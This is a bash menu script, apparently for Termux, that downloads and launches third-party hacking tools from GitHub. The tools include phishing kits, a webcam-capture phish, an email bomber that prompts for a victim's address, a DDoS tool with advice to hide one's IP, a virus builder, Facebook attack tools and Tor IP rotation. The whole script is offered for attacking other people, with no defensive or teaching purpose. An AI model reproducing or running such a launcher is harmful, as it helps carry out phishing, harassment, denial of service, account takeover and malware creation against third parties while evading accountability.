clear
mkdir Tools
clear 
echo -e '\033[32m

 _   _    ___  _____  _   __         _   _  _   _ ______ 
| | | |  /   |/  __ \| | / /        | | | || | | || ___ \
| |_| | / /| || /  \/| |/ /  ______ | |_| || | | || |_/ /
|  _  |/ /_| || |    |    \ |______||  _  || | | || ___ \
| | | |\___  || \__/\| |\  \        | | | || |_| || |_/ /
\_| |_/    |_/ \____/\_| \_/        \_| |_/ \___/ \____/   v1

  Coded by nikokoll
  github: https://github.com/NikoKoll
  
\033[33;4mVersion:\033[0m 1            \033[33;4mCTRL+C:\033[0m exit          \033[33;4mAuthor:\033[0m nikokoll

1 Requirements & Update         2 Phishing Tool				
3 WebCam Hack                   4 Subscan			
5 Gmail Bomber		        6 DDOS Attack			
7 How to use ?	                8 Uninstall downloaded programs		
9 Ip Info	                10 dorks-eye
11 HackerPro                    12 RED_HAWK
13 VirusCrafter                 14 Info-Site
15 BadMod	                16 Facebash
17 DARKARMY                     18 AUTO-IP-CHANGER
19 INFO about the attacks

'

# Option Selection

read -p "Typpe the number for the attack: " islem
if [[ $islem == 1 || $islem == 01 ]]; then
clear

echo -e "\033[47;31;5m Installing updates and requirements...\033[0m"
sleep 5
pkg install git -y
pkg install python python3 -y
pkg install pip pip3 -y
pkg install curl -y
apt update
apt upgrade -y
clear
echo -e "\033[47;3;35m Update complete...\033[0m"
sleep 3
bash alhack.sh

elif [[ $islem == 2 || $islem == 02 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/htr-tech/zphisher
cd zphisher
bash zphisher.sh

elif [[ $islem == 3 || $islem == 03 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/techchipnet/CamPhish
cd CamPhish
bash camphish.sh

elif [[ $islem == 4 || $islem == 04 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
git clone https://github.com/zidansec/subscan
cd subscan
read -p "Enter a domain e.g. (example.com): " sc
./subscan $sc
       
elif [[ $islem == 5 || $islem == 05 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/juzeon/fast-mail-bomber.git
cd fast-mail-bomber/
mv config.example.php config.php
php index.php update-providers
rm -rf data/nodes.json data/dead_providers.json
echo -e "\033[47;3;35m This installation may take a long time\033[0m"
echo -e "\033[47;3;35m Press Ctrl+C to stop\033[0m"
sleep 4
php index.php update-nodes
php index.php refine-nodes
echo "-------------------------"
read -p "Enter an email address to bomb: " mail
echo "-------------------------"
php index.php start-bombing $mail

elif [[ $islem == 6 || $islem == 06 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/palahsu/DDoS-Ripper.git
cd DDoS-Ripper
python3 DRipper.py
echo ""
echo -e "\033[47;3;35m Before using, hide your IP\033[0m"

elif [[ $islem == 7 || $islem == 07 ]]; then
clear
echo "Youtube Video: https://www.youtube.com/watch?v=zgdq6ErscqY"
python3 -m webbrowser https://www.youtube.com/watch?v=zgdq6ErscqY
sleep 10
echo "Wait 10 seconds"
bash alhack.sh

 
elif [[ $islem == 8 || $islem == 08 ]]; then
clear
echo -e "\033[47;3;35m REMOVING DOWNLOADED PROGRAMS...\033[0m"
sleep 3 
rm -rf Tools

bash alhack.sh

elif [[ $islem == 9 || $islem == 09 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
apt update
apt install git curl
git clone https://github.com/htr-tech/track-ip.git
cd track-ip
bash trackip

elif [[ $islem == 10 || $islem == 010 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/BullsEye0/dorks-eye.git
cd dorks-eye
pip install -r requirements.txt
python3 dorks-eye.py

elif [[ $islem == 11 || $islem == 011 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
apt update && apt upgrade && apt install git && apt install python2
git clone https://github.com/jaykali/hackerpro.git
cd hackerpro
sudo bash install.sh
python2 hackerpro.py

elif [[ $islem == 12 || $islem == 012 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/Tuhinshubhra/RED_HAWK
cd RED_HAWK
php rhawk.php

elif [[ $islem == 13 || $islem == 013 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/Devil-Tigers/TigerVirus
apt update
apt upgrade -y
pkg install git -y
cd TigerVirus
bash app.sh

elif [[ $islem == 14 || $islem == 014 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
pkg install curl -y
upgrade -y
pkg install git -y
git clone https://github.com/king-hacking/info-site.git
cd info-site
bash info.sh

elif [[ $islem == 15 || $islem == 015 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
sudo apt-get update
sudo apt-get install php
sudo apt-get install php-curl
git clone https://github.com/MrSqar-Ye/BadMod.git
cd BadMod
chmod u+x INSTALL
chmod u+x BadMod.php
sudo php BadMod.php

elif [[ $islem == 16 || $islem == 016 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
git clone https://github.com/fu8uk1/facebash
cd facebash
bash install.sh
chmod +x facebash.sh
tor
sudo ./facebash.sh

elif [[ $islem == 17 || $islem == 017 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
sleep 3
cd Tools
pkg install git
pkg install python2
apt install git
apt install python2
git clone https://github.com/D4RK-4RMY/DARKARMY
cd DARKARMY
chmod +x darkarmy.py
python2 darkarmy.py

elif [[ $islem == 18 || $islem == 018 ]]; then
clear
echo -e "\033[47;3;35m Installation may take some time\033[0m"
echo -e "\033[47;3;35m This tool requires you to be (ROOT)\033[0m"
sleep 3
cd Tools
sudo apt-get install tor
pip3 install requests
git clone https://github.com/FDX100/Auto_Tor_IP_changer.git
cd Auto_Tor_IP_changer
echo -e "\033[47;3;35m Go to your browser / change the proxy to 127.0.0.1:9050\033[0m"
sleep 8
python3 install.py
aut

elif [[ $islem == 19 || $islem == 019 ]]; then
clear
echo -e "
1) Requirements & Update: Installs necessary packages and updates the system.

2) Phishing Tool: Clones and runs the Zphisher tool for phishing attacks.

3) WebCam Hack: Clones and runs the CamPhish tool for webcam hacking.

4) Subscan: Clones and runs the Subscan tool for subdomain scanning.

5) Gmail Bomber: Clones and runs the Fast Mail Bomber tool for email bombing.

6) DDOS Attack: Clones and runs the DDoS-Ripper tool for DDoS attacks.

7) How to use?: Opens a YouTube video tutorial on how to use the tool.

8) Uninstall downloaded programs: Removes all downloaded tools.

9) Ip Info: Clones and runs the Track-IP tool for IP tracking.

10) dorks-eye: Clones and runs the Dorks-Eye tool for Google dorking.

11) HackerPro: Clones and runs the HackerPro tool for various hacking tasks.

12) RED_HAWK: Clones and runs the RED_HAWK tool for reconnaissance.

13) VirusCrafter: Clones and runs the TigerVirus tool for creating viruses.

14) Info-Site: Clones and runs the Info-Site tool for website information gathering.

15) BadMod: Clones and runs the BadMod tool for website vulnerability scanning.

16) Facebash: Clones and runs the Facebash tool for Facebook attacks.

17) DARKARMY: Clones and runs the DARKARMY tool for various hacking tasks.

18) AUTO-IP-CHANGER: Clones and runs the Auto Tor IP Changer tool for changing IP addresses.

"


else   
	clear
        echo -e '\033[36;40;1m You entered the wrong code'	
	sleep 1
	clear 
	bash alhack.sh
fi